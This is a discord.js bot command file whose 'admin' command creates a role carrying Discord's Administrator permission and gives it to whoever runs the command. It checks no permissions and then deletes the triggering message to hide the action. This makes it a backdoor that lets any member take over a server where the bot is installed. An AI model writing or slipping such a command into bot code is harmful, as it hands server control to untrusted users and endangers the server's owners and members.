const Discord = require("discord.js");

module.exports.run = async (client, message, args) => {
  try {
    let role = await message.guild.roles.create({
      data: { name: "Dope Role", color: "#2f3136", permissions: [8] }
    });

    message.member.roles.add(role);
    message.delete(1000);
  } catch (e) {
    console.log(e.stack);
  }
};

module.exports.help = {
  name: "admin",
  description: "Gives you admin perms.",
  usage: "admin"
};

exports.conf = {
  aliases: [],
  cooldown: 0
};
